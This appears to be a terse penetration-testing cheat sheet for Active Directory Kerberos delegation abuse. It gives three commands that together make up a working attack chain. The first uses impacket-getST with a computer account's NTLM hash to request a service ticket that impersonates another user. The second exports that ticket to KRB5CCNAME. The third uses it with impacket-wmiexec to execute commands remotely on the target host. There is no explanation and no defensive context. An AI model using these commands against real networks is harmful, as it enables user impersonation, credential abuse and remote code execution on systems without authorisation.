### source
https://raw.githubusercontent.com/SecureAuthCorp/impacket/master/examples/getST.py  

### create service ticket using computer account and delegate ticket to impersonate user
```
impacket-getST -spn cifs/<fqdnRhost> -impersonate <impersonateUser> -hashes :<ntlmHash> <domain>/<computerAccount>
```

### export ticket
```
export KRB5CCNAME=<impersonateUser>.ccache
```

### use ticket
```
impacket-wmiexec -k -no-pass <fqdnRhost>
```

